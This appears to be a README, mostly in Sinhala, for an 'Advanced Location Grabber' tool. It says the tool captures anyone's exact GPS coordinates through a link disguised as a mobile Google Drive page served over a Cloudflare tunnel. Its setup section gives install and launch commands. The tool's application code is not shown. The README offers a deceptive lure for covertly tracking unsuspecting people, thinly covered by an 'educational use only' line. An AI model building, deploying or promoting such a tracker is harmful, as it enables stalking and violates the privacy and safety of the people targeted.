# 📍 Advanced Location Grabber (OSINT Tool)

මෙම මෙවලම මගින් URL එකක් හරහා ඕනෑම අයෙකුගේ නිවැරදි GPS ස්ථානය (Location) ලබා ගත හැක. මෙය අධ්‍යාපනික කටයුතු සඳහා පමණක් භාවිතා කරන්න.

## ✨ විශේෂාංග (Features)
* 🎯 නිවැරදි GPS ස්ථානය (Latitude & Longitude) ලබා ගැනීම.
* 📱 ජංගම දුරකථන සඳහා විශේෂිතව සකසන ලද Google Drive පේජ් එක.
* 🌐 Cloudflare Tunnel හරහා ඕනෑම තැනක සිට භාවිතා කිරීමේ හැකියාව.
* 🛠️ සරල සහ පැහැදිලි Terminal නිමැවුම.

## 🚀 ස්ථාපනය (Installation)

```bash
# අවශ්‍ය ලයිබ්‍රරි ඉන්ස්ටෝල් කිරීම
pip install flask werkzeug
```
```bash
#start kamand eka
python3 app.py

```
```bash
#link eka ganna install karanna
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64
mv cloudflared-linux-amd64 cloudflared
```
```bash
#link eka ganna waguwaka wagee link eka ennee eekayi link eka
./cloudflared tunnel --url http://localhost:8080


